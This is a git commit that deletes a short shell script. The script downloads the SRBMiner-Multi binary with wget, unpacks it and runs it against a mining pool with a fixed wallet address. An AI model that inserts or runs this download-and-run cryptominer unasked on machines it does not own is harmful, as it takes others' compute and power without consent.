453dc85e67d27172016c0c5afe6c4c74a4a8d383
mdk721 <68358195+mdk721@users.noreply.github.com>
2022-06-17 09:52:14 +0300

    Delete paygopool.sh

--- paygopool.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
-tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
-./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BiQnizGzocTpGQGdV5AMNjEmAJXU6SWw3n.$(echo $(shuf -i 10000-99999 -n 1)-Maho) --password x
